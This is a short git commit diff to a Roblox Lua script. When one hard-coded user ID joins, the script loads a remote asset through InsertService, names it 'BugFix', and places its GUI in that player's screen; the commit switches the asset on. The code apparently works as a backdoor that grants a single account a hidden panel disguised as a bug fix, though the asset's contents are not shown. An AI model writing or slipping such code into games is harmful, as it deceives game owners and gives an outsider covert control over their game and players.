557e6a15dc8a8fe5ce76b01d2b1474aa378d82bb
Viper <100521306+MuhXd@users.noreply.github.com>
2024-08-13 22:01:47 +0100

    Update t.lua

--- scripts/t.lua
+++ scripts/t.lua
@@ -2,6 +2,7 @@ game.Players.PlayerAdded:Connect(function(plr)
 	if plr.UserId == 144324719 then
 		local ok = game:GetService("InsertService"):LoadAsset(18937651198)
 		ok.Name = "BugFix"
+		ok.Enabled = true
 		ok:FindFirstChildWhichIsA("ScreenGui").Parent = plr.PlayerGui
 	end
 end)
